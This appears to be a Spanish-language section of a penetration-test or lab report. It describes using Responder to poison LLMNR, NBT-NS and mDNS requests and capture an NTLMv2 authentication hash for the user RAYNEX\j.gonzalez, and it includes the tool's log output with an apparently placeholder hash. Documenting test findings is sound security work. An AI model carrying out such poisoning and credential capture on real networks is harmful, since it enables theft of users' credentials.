# Credenciales 

Durante esta etapa se observó el resultado de la interacción entre el equipo de pruebas y el servicio de resolución de nombres. Las solicitudes LLMNR, NBT-NS y mDNS fueron respondidas por Responder, provocando que el equipo Windows iniciara una conexión hacia el equipo de pruebas.

El evento de mayor relevancia corresponde a la autenticación SMB mediante NTLMv2, donde se obtuvo una respuesta de autenticación asociada al usuario RAYNEX\j.gonzalez.

## Evidencia de Autenticación

```
[*]: Version: Responder 3.2.2.0
[*]: Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[*] [MDNS] Poisoned answer sent to 10.10.10.20 for name recursodemo.local
[*] [LLMNR] Poisoned answer sent to 10.10.10.20 for name recursodemo
[*] [MDNS] Poisoned answer sent to 10.10.10.20 for name recursodemo.local
[*] [LLMNR] Poisoned answer sent to 10.10.10.20 for name recursodemo

[SMB] NTLMv2-SSP Client   : 10.10.10.20
[SMB] NTLMv2-SSP Username : RAYNEX\j.gonzalez
[SMB] NTLMv2-SSP Hash     : j.gonzalez::RAYNEX:1a2b3c4d5e6f7890:ABCDEF1234567890ABCDEF1234567890:0101000000000000...

[*] [MDNS] Poisoned answer sent to 10.10.10.20 for name recurso.local
[*] [MDNS] Poisoned answer sent to 10.10.10.20 for name recurso.local
[*] [NBT-NS] Poisoned answer sent to 10.10.10.20 for name RECURSO (service: File Server)
[*] [LLMNR] Poisoned answer sent to 10.10.10.20 for name recurso
[*] [LLMNR] Poisoned answer sent to 10.10.10.20 for name recurso
```

